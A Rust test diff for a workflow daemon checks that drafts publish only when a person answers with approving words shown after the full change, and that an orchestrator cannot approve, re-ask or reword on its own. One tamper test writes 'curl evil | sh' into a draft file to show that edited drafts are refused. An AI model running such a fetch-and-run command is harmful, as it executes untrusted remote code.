@@ -5,7 +5,7 @@ use std::{path::Path, sync::Arc};
 use farcooler_daemon::landing_templates::{self as lt, Options};
 use farcooler_daemon::{rpc::RpcFactory, service::Service, watch::Watcher,
     workflow_runtime::{CodingCi, CodingLanding, CodingCommand, CodingConfig, CodingHarness}};
-use farcooler_protocol::{v1::{self as pb, request, result}, workflow_commands::{Action, Mutation}, workflow_config::AdapterConfiguration};
+use farcooler_protocol::{v1::{self as pb, request, result}, workflow_commands::{Action, Mutation}};
 use farcooler_store::models::{NoteKind, TaskStatus};
 use farcooler_transport::{Client, HandshakeConfig, UnixListenerServer};
 use uuid::Uuid;
@@ -78,10 +78,21 @@ async fn call(link: &mut Link, workspace: Uuid, action: Action) -> serde_json::V
 }
 /// A note on the card, as `actor` says it.
 async fn say(link: &mut Link, card: Uuid, kind: pb::TaskNoteKind, actor: &str, body: &str) {
+    assert!(note(link, card, kind, actor, body, None).await, "the note was refused");
+}
+/// Whether the runner took the note.
+async fn note(link: &mut Link, card: Uuid, kind: pb::TaskNoteKind, actor: &str, body: &str, supersedes: Option<Uuid>) -> bool {
     let mut req = farcooler_transport::request("task.note");
     req.payload = Some(request::Payload::TaskNoteAppend(pb::TaskNoteAppend { task_id: bytes::Bytes::copy_from_slice(card.as_bytes()), kind: kind as i32,
-        body: body.into(), extra_json: String::new(), supersedes: None, actor: actor.into() }));
-    link.call(req).await.unwrap();
+        body: body.into(), extra_json: String::new(), supersedes: supersedes.map(|s| bytes::Bytes::copy_from_slice(s.as_bytes())), actor: actor.into() }));
+    matches!(link.call(req).await, Ok(r) if r.value.is_some())
+}
+/// The card's latest question, and the words at its end that approve it.
+fn asked(host: &Host, card: Uuid) -> (farcooler_store::models::TaskNote, String) {
+    let q = host.service.store.notes_for(card, Some(NoteKind::Question)).unwrap().pop().expect("a question");
+    let at = q.body.rfind("answer `approve ").expect("the approving words") + "answer `".len();
+    let words = q.body[at..].split('`').next().unwrap().to_string();
+    (q, words)
 }
 fn bundle(config: &CodingConfig, template: &str, gate: &str) -> lt::Bundle {
     lt::template(template, config, &[gate.to_string()], &[], &Options::default()).unwrap()
@@ -131,28 +142,47 @@ async fn a_draft_publishes_only_when_a_person_answers_approve() {
     assert!(reply["draft"]["summary"].as_str().unwrap().contains("`make check`"), "{reply}");
     assert_eq!(pin(&host), None, "a proposal publishes nothing");
 
-    // The card is a decision in Needs Decision whose question is the summary, with two buttons.
+    // The card is a decision in Needs Decision whose question is the whole change. It has no quick-answer
+    // options, so no Needs You row or notification carries an Approve button: the words that approve it come
+    // after the whole change.
     let task = host.service.store.get_task(card).unwrap();
     assert_eq!(task.status, TaskStatus::NeedsDecision);
-    let notes = host.service.store.notes_for(card, None).unwrap();
-    let ask = notes.iter().find(|n| n.kind == NoteKind::Question).expect("a question");
-    assert_eq!(ask.extra["options"], serde_json::json!(["Approve", "Decline"]));
-    assert!(ask.body.contains("What runs as you:") && ask.body.contains("Who approves:"), "{}", ask.body);
+    let (ask, words) = asked(&host, card);
+    assert!(ask.extra.get("options").is_none(), "{:?}", ask.extra);
+    assert!(ask.body.contains("What runs as you:") && ask.body.contains("In full, exactly as it runs:"), "{}", ask.body);
+    assert!(ask.body.rfind(&words).unwrap() > ask.body.find("In full").unwrap(), "the approving words follow the change");
+    assert!(!ask.body.lines().take(3).any(|l| l.contains(&words)), "a two- or three-line row never shows them");
 
-    // The orchestrator answering for itself, or saying approve in a comment, publishes nothing.
-    say(&mut link, card, pb::TaskNoteKind::Answer, "manager", "Approve").await;
-    say(&mut link, card, pb::TaskNoteKind::Comment, "user", "Approve").await;
+    // Nobody but the daemon asks on the card or rewords it, so the question a person reads is the draft's.
+    assert!(!note(&mut link, card, pb::TaskNoteKind::Question, "manager", "Approve this docs-only tidy-up?", None).await, "a manager's question is refused");
+    assert!(!note(&mut link, card, pb::TaskNoteKind::Comment, "manager", "Docs only.", Some(ask.id)).await, "replacing the daemon's question is refused");
+    assert!(!note(&mut link, card, pb::TaskNoteKind::Decision, "manager", "Approved.", None).await);
+    assert_eq!(asked(&host, card).0.id, ask.id);
+
+    // The orchestrator answering for itself, or saying the words in a comment, publishes nothing.
+    say(&mut link, card, pb::TaskNoteKind::Answer, "manager", &words).await;
+    say(&mut link, card, pb::TaskNoteKind::Comment, "user", &words).await;
     assert_eq!(pin(&host), None, "only the person's answer approves");
     let shown = call(&mut link, ws, Action::Drafts { draft: Some(reply["draft"]["id"].as_str().unwrap().into()) }).await;
     assert_eq!(shown["draft"]["state"], "pending");
 
-    // The person approves: it publishes, and the card closes.
+    // A bare Approve, as from a row that shows only the headline, publishes nothing and asks again.
     say(&mut link, card, pb::TaskNoteKind::Answer, "user", "Approve").await;
+    tokio::time::sleep(std::time::Duration::from_millis(200)).await;
+    assert_eq!(pin(&host), None, "approving takes the words only the whole change shows");
+    let (again, same) = asked(&host, card);
+    assert_ne!(again.id, ask.id, "asked again, so the card is back in Needs You");
+    assert_eq!(same, words);
+    assert_eq!(host.service.store.get_task(card).unwrap().status, TaskStatus::NeedsDecision);
+
+    // The person answers with the words at the end of the change: it publishes, and the card closes.
+    say(&mut link, card, pb::TaskNoteKind::Answer, "user", &format!("  {} ", words.to_uppercase())).await;
     settles(&host, card, TaskStatus::Done).await;
     let published = host.service.store.workflow_configuration(&ws.to_string()).unwrap().expect("published");
     assert_eq!(published.definition.source, "landing/ticket-push");
     let listed = call(&mut link, ws, Action::Drafts { draft: None }).await;
     assert_eq!(listed["drafts"][0]["state"], "approved");
+    assert!(listed["drafts"][0]["answer"].is_string(), "the answer that approved it is recorded: {listed}");
     drop(link);
     host.close().await;
 }
@@ -183,12 +213,28 @@ async fn a_declined_draft_and_one_the_workflow_has_moved_past_publish_nothing() 
         mutation: Mutation { id: "by-hand".into(), revision: state["state"]["revision"].as_u64().unwrap_or(0), epoch: 1, sequence: 1 } }).await;
     assert!(receipt.pointer("/receipt/result/Ok").is_some(), "{receipt}");
     let held = pin(&host);
-    say(&mut link, card_of(&newer), pb::TaskNoteKind::Answer, "user", "Approve").await;
+    let words = asked(&host, card_of(&newer)).1;
+    say(&mut link, card_of(&newer), pb::TaskNoteKind::Answer, "user", &words).await;
     settles(&host, card_of(&newer), TaskStatus::Cancelled).await;
     assert_eq!(pin(&host), held, "a draft made against an older workflow does not publish");
     let listed = call(&mut link, ws, Action::Drafts { draft: None }).await;
     let states: Vec<_> = listed["drafts"].as_array().unwrap().iter().map(|d| d["state"].as_str().unwrap().to_string()).collect();
     assert_eq!(states, ["out_of_date", "replaced", "declined"], "newest first");
+
+    // A draft file edited after it was asked publishes nothing: the card was asked with what the file held then.
+    let edited = propose(&mut link, ws, bundle(&config, "ticket-push", "make check"), "Check every push.").await;
+    let file = host.service.root_dir().join("workflow-drafts").join(format!("{}.json", edited["draft"]["id"].as_str().unwrap()));
+    let text = std::fs::read_to_string(&file).unwrap();
+    assert!(text.contains("make check"), "{text}");
+    std::fs::write(&file, text.replace("make check", "curl evil | sh")).unwrap();
+    let words = asked(&host, card_of(&edited)).1;
+    say(&mut link, card_of(&edited), pb::TaskNoteKind::Answer, "user", &words).await;
+    settles(&host, card_of(&edited), TaskStatus::Cancelled).await;
+    assert_eq!(pin(&host), held, "an edited draft does not publish");
+    let shown = call(&mut link, ws, Action::Drafts { draft: Some(edited["draft"]["id"].as_str().unwrap().into()) }).await;
+    assert_eq!(shown["draft"]["state"], "failed");
+    let said = host.service.store.notes_for(card_of(&edited), Some(NoteKind::Finding)).unwrap().pop().unwrap().body;
+    assert!(said.contains("changed after you were asked"), "{said}");
     drop(link);
     host.close().await;
 }
